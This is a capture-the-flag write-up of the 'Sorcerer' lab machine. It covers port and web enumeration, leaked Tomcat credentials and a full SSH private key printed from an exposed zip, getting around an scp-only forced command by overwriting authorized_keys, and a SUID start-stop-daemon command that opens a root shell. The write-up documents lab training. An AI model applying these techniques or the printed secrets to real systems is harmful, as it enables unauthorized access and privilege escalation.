# CTF Writeup: Sorcerer

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.130.100
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-25 03:48 EST
Nmap scan report for 192.168.130.100
Host is up (0.028s latency).
Not shown: 65524 closed tcp ports (reset)
PORT      STATE    SERVICE  VERSION
22/tcp    open     ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 81:2a:42:24:b5:90:a1:ce:9b:ac:e7:4e:1d:6d:b4:c6 (RSA)
|   256 d0:73:2a:05:52:7f:89:09:37:76:e3:56:c8:ab:20:99 (ECDSA)
|_  256 3a:2d:de:33:b0:1e:f2:35:0f:8d:c8:d7:8f:f9:e0:0e (ED25519)
80/tcp    open     http     nginx
|_http-title: Site doesn't have a title (text/html).
111/tcp   open     rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/udp   nfs_acl
2049/tcp  open     nfs_acl  3 (RPC #100227)
7742/tcp  open     http     nginx
|_http-title: SORCERER
8080/tcp  open     http     Apache Tomcat 7.0.4
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.4
34625/tcp open     mountd   1-3 (RPC #100005)
43449/tcp open     mountd   1-3 (RPC #100005)
45551/tcp open     nlockmgr 1-4 (RPC #100021)
49951/tcp open     mountd   1-3 (RPC #100005)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   29.56 ms 192.168.45.1
2   29.52 ms 192.168.45.254
3   29.81 ms 192.168.251.1
4   29.95 ms 192.168.130.100

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.88 seconds
```

There seems to be multiple rpc and http instances running, let's start with enumerating the webpage running on port 80. 

```
feroxbuster -u http://192.168.130.100           
                                                                                                                                              
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.130.100/
 🚩  In-Scope Url          │ 192.168.130.100
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l        3w       14c http://192.168.130.100/
[####################] - 20s    30000/30000   0s      found:1       errors:0      
[####################] - 19s    30000/30000   1580/s  http://192.168.130.100/ 
```

Upon inspecting the page it's a deadend. It responds with an written out 404 error & feroxbuster also wasn't able to enumerate any endpoints.

Let's move on with the webpage running on 7742, which looks more promising.

Upon accessing we can tell that the webpage is an Control Panel with login functionality.

We also discovered an very interesting endpoint called /zipfiles. It stored 4 .zip files with usernames. Let's download them locally and retrieve the information.

```
feroxbuster -u http://192.168.130.100:7742
                                                                                                                                              
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.130.100:7742/
 🚩  In-Scope Url          │ 192.168.130.100
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       65l      117w     1219c http://192.168.130.100:7742/
301      GET        7l       12w      178c http://192.168.130.100:7742/default => http://192.168.130.100:7742/default/
301      GET        7l       12w      178c http://192.168.130.100:7742/zipfiles => http://192.168.130.100:7742/zipfiles/
200      GET       13l       82w     4741c http://192.168.130.100:7742/zipfiles/miriam.zip
200      GET       39l      203w    13898c http://192.168.130.100:7742/zipfiles/max.zip
200      GET       13l       81w     4749c http://192.168.130.100:7742/zipfiles/francis.zip
200      GET       13l       82w     4733c http://192.168.130.100:7742/zipfiles/sofia.zip
[####################] - 22s    60005/60005   0s      found:7       errors:0      
[####################] - 21s    30000/30000   1431/s  http://192.168.130.100:7742/ 
[####################] - 21s    30000/30000   1430/s  http://192.168.130.100:7742/default/ 
[####################] - 0s     30000/30000   375000/s http://192.168.130.100:7742/zipfiles/ => Directory listing (add --scan-dir-listings to scan)
```

Unzipping the max.zip file on our local machine gave us an interesting .sh file and an .bak file which stored tomcat login credentials

```
tomcat:VTUD2XxJjf5LPmu6
```

We also retrieved the id_rsa private key of user max.

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEAt/bdQL2FWSqIZy8+sfdp19nLsDMrirNKlDFvT2vs6WZNoW/2bFCw
SkIBbiE1bWoSYrKan0WPpKhfESuk69Lw3Aj+I2wo2nSd5n2Phua7C2xn3pN72/XayZCdPp
QZvPzhIU4cFhY5HWrNqASRfMUoOHcUuowvMLJ+5Qfi98UkuwPOEZ4V10BhoYxjXxunqTwf
N8k1eWsA0GX7qWAgEf3+Y68cyNuozOOCrDam9NaciZRZfioDrNaQr174mYtEYAnynmKuek
KOmdM9vULwrkNesK9MeNiAk1Lkfk5L/I3sUTqy83PgBJPnAW2/1hP21W0irKyt8QfQZfVf
bkSU/32jBDSMqWXHoohARsAHE+ZVuedcKnLcIth8CLr9dssi7MGL+7kr0UNSlP49CuMHmT
qgzoNVOPpJRotYrNx7BSq1GbEFLty4ObR5F1rYYLZUTnWtkN94191rFfD92ePona4kzLyZ
7djcAgxKMaYvx1/9qdBuT3YGtfoF3lxXPPPg2chlYOMltXHUkf/o0ypp5bgvARpPoaJHxm
1936vQSHohXmxpyMvqctXuJPKrVky7ho24SJD0tzya4YEs8NqOiF6Jm6XlgjJwFz4Gf8f+
PTiqZB6IEFAKEjcIH3YYJsy89OjFYE/mqdE6O1bE7wSWHUIr/ZJlV7UEKFAgF9G/OH2s1k
EAAAdIBLPUkASz1JAAAAAHc3NoLXJzYQAAAgEAt/bdQL2FWSqIZy8+sfdp19nLsDMrirNK
lDFvT2vs6WZNoW/2bFCwSkIBbiE1bWoSYrKan0WPpKhfESuk69Lw3Aj+I2wo2nSd5n2Phu
a7C2xn3pN72/XayZCdPpQZvPzhIU4cFhY5HWrNqASRfMUoOHcUuowvMLJ+5Qfi98UkuwPO
EZ4V10BhoYxjXxunqTwfN8k1eWsA0GX7qWAgEf3+Y68cyNuozOOCrDam9NaciZRZfioDrN
aQr174mYtEYAnynmKuekKOmdM9vULwrkNesK9MeNiAk1Lkfk5L/I3sUTqy83PgBJPnAW2/
1hP21W0irKyt8QfQZfVfbkSU/32jBDSMqWXHoohARsAHE+ZVuedcKnLcIth8CLr9dssi7M
GL+7kr0UNSlP49CuMHmTqgzoNVOPpJRotYrNx7BSq1GbEFLty4ObR5F1rYYLZUTnWtkN94
191rFfD92ePona4kzLyZ7djcAgxKMaYvx1/9qdBuT3YGtfoF3lxXPPPg2chlYOMltXHUkf
/o0ypp5bgvARpPoaJHxm1936vQSHohXmxpyMvqctXuJPKrVky7ho24SJD0tzya4YEs8NqO
iF6Jm6XlgjJwFz4Gf8f+PTiqZB6IEFAKEjcIH3YYJsy89OjFYE/mqdE6O1bE7wSWHUIr/Z
JlV7UEKFAgF9G/OH2s1kEAAAADAQABAAACAEljyZaHRQhyaGJJvcg/vNDoyVKsx0UZC7qd
EhvsIWJndrbdtMA3XGzzciCeTPMuatFHEVpS5OA6b1qpP6z4xS/ywngdMRsdhNSr6LNXnu
0KvVFVIwd4SGU7NQ//A1maxLGFuLyy9uwebJcH44aUHNyR3Qoi3LyfqPHzuH9B/cpB1Va/
61SpEYniOM57eOKR4p5dveCHaJa66LAEcibbXj4kYOZcgzXh2YKcdvScHWzhauZjGn48Rx
I/YAvZPFjX/xtioNqTbNI/LJUxfFT4+XChLm/TZ0/etNsSn0vMzqcFNNjctFT/MBwozWw5
ILK6TCf455eNl3zla8HQyGQ4mexpZZPHaSPO9fjmE8kGC264dPsnBCMT+/VnacQDIY69fB
Oq6dTztBmZTZUtZvZv81XgTC1YLW89Xu+wKBgpPeZTb5+hvO5O40q/1TVF2BjXHHp2pEnd
qYMEBtdzPiTipO3yfvqBeV+GOfBTpPvelpPRx/lIHhNwk6GwJ6230+JKPyOtCCZ2hpsVHF
wHQx4TZ5yQo+Wfb49Vr0awFS8PjowPyBpo3mrlskVa/SL7QeJhvNPKn0dyF3ljD8a3sSup
aK4VM1poOF+3WmB8jac0pbvBFaypsNPde1u7WorwZBaffNhe6cqBZ2K5s4EZT1FQ2BRO9n
wl5aqBUlqwh6ATK3WxAAABAQC7f809+Uc7u2vkgdol/lvQcRWK7ynUoFuNaFiui1RJRSsS
7otY1SGyXsUh7CNCTyOFjU/0ke7gwD8KZeIPZwNQThp1eISi1HHPSI5Y/R1kzKMW63ZspC
P375mKmyignBrlolsqHzZq+WqJKoRcrJgVzKJoB7ExJrcOPP9TYJKFT9OkN0cZk30OuvvX
RI0gOuVnQHUp87lZiTj67L0dJt4x+gxNT71RradHx66I44muY6ANU7h+eQ39jSi7lZLU48
5jy5FCN1tBcwpLygwiT0KGqnmtomDusamI/qjCbY5yvx5HYlxwTuLNbWkNiUmovNcx4u25
dq79EeFGQ0RfuV2WAAABAQDbJhOtD+wbtjqmJaJVAlHXNnMaty2X4s2BY3sYvDvE9tU2UD
DjFhWc1cOWF6WibKC9kUc6/hiNnKj4LhngJeYl68ZZRrZySQF+6DngJFM8+TUA9veBbtdO
kKzmsHed6JQ/Jb54u/kYe3YHzy0XjnbJ5eKX+5Y28xCrL7HwE2QqVSgHjhJxRuMHhd+wtk
f3l0OtP6fkKDT+MmWgelsamLPAHUN+JB26P+gOJvkHLQsJUyGQf6KbSJdjb5YrExzv7DA6
9DCnuFOowUJmIBZFJW8gl/bbqSHe/m2tFYAkShaV+6/oivKo+aEhsTNmd0XuCV8L6dVYEr
IYEOr3Wp6sqIzVAAABAQDW5iq/v65Gw/65sQsDPvlNW3I8UF9ww0hBAJMp0DJQIDpjWoa3
ggO9GXhduntB3TtHViA25ksS7nDrddC2tNgiz1qnpaR5JtX/WEEgX9Xxaz/iPYbEY471hN
jW+j7KBZj9ytmbXXyasK1dwoheXPGiUYYAWXr5QllAxfYyrblQnik/ldcMItyNfOW2UdWj
KZNW6M6KAssBs6y7Sn/E5lid3VN3ET/3kVeuBbOAg0ZSygKIni9Re2FEl0bubFtWwmW/5k
6PQ2RfbQO9eeOaH4W9/rD5qAokP4k9wJWmlon2rJcJRQs+wR/9Bywa0lBmSO6cJzZ0iuu3
uQx0OZIkU+m9AAAADG1heEBzb3JjZXJlcgECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```

But logging into the server via ssh didn't work.

```
ssh -i id_rsa max@192.168.130.100   
The authenticity of host '192.168.130.100 (192.168.130.100)' can't be established.
ED25519 key fingerprint is: SHA256:VS30806A83YR6y/jbQ1fv89VM1FjmXYbb9zmKkJ5N+4
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.130.100' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa": bad permissions
max@192.168.130.100: Permission denied (publickey).
```

## Initial Access

Let's analyze the scp_wrapper.sh script.

```
cat scp_wrapper.sh      
#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "ACCESS DENIED."
    scp
    ;;
esac
```

The script itself forces every command utilized with ssh leading to access denied, besides scp.

When observing the authorized_keys file we can also see that the script basically get's executed every single time when we want to login into ssh.

```
cat authorized_keys       
no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty,command="/home/max/scp_wrapper.sh" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC39t1AvYVZKohnLz6x92nX2cuwMyuKs0qUMW9Pa+zpZk2hb/ZsULBKQgFuITVtahJispqfRY+kqF8RK6Tr0vDcCP4jbCjadJ3mfY+G5rsLbGfek3vb9drJkJ0+lBm8/OEhThwWFjkdas2oBJF8xSg4dxS6jC8wsn7lB+L3xSS7A84RnhXXQGGhjGNfG6epPB83yTV5awDQZfupYCAR/f5jrxzI26jM44KsNqb01pyJlFl+KgOs1pCvXviZi0RgCfKeYq56Qo6Z0z29QvCuQ16wr0x42ICTUuR+Tkv8jexROrLzc+AEk+cBbb/WE/bVbSKsrK3xB9Bl9V9uRJT/faMENIypZceiiEBGwAcT5lW551wqctwi2HwIuv12yyLswYv7uSvRQ1KU/j0K4weZOqDOg1U4+klGi1is3HsFKrUZsQUu3Lg5tHkXWthgtlROda2Q33jX3WsV8P3Z4+idriTMvJnt2NwCDEoxpi/HX/2p0G5Pdga1+gXeXFc88+DZyGVg4yW1cdSR/+jTKmnluC8BGk+hokfGbX3fq9BIeiFebGnIy+py1e4k8qtWTLuGjbhIkPS3PJrhgSzw2o6IXombpeWCMnAXPgZ/x/49OKpkHogQUAoSNwgfdhgmzLz06MVgT+ap0To7VsTvBJYdQiv9kmVXtQQoUCAX0b84fazWQQ== max@sorcerer
```

We could fix the issue by just removing the configurations within the authorized_keys file and upload the authorized_keys file onto the target system via scp. 

It worked.

```
scp -O /home/saitama/Desktop/Exploiting/OSCP_Prep/ProvingGrounds/Linux/Sorcerer/home/max/.ssh/authorized_keys max@192.168.130.100:/home/max/.ssh/authorized_keys
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
authorized_keys
```

We should now be able to login into ssh with user "max". Logged in successfully.

```
ssh -i id_rsa max@192.168.130.100
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
max@sorcerer:~$
```

Retrieved local.txt in /home/dennis directory.

```
246acaed4435d3cf69e46d9dd1268c8e
```


## Privilege Escalation

Enumerated SUID Binaries and found start-stop-daemon binary to be interesting.
Navigated onto gtfobins.github.io and searched up for start-stop-daemon

Abused the following PoC and gained root shell

```
max@sorcerer:/home/dennis$ /usr/sbin/start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p
# whoami
root
```
